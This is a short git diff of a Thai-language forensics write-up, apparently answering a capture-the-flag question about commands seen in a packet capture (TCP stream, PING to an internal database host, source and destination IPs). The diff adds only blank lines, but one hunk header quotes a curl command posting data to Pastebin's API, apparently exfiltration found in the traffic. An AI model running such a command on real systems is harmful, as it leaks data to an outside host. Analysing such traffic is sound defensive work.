@@ -87,6 +87,7 @@ Q: จากในภาพคำสั่งทั้งหมดจาก Linu
 1.1 สิ่งที่เห็นในเนื้อหา (Follow TCP Stream)
 
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/bdba076a-7bd9-4087-b3f6-46fba37d8da6" />
+
 ```
 PING mysql-m1.prod.htb (10.10.20.14)
 ```
@@ -110,11 +111,13 @@ curl -d "api_user_key=..." https://pastebin.com/api/api_post.php
 1.2 เส้นทางการส่ง (ข้ามสาย)
 
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0c28492f-d191-48e9-b907-852eed99e3ab" />
+
 ```
 Source: 10.10.99.42
 Destination: 10.10.20.13
 Protocol: TCP
 ```
+
 หมายความว่า
 
 - เครื่อง 10.10.99.42 กำลังส่งข้อมูลไปยัง 10.10.20.13
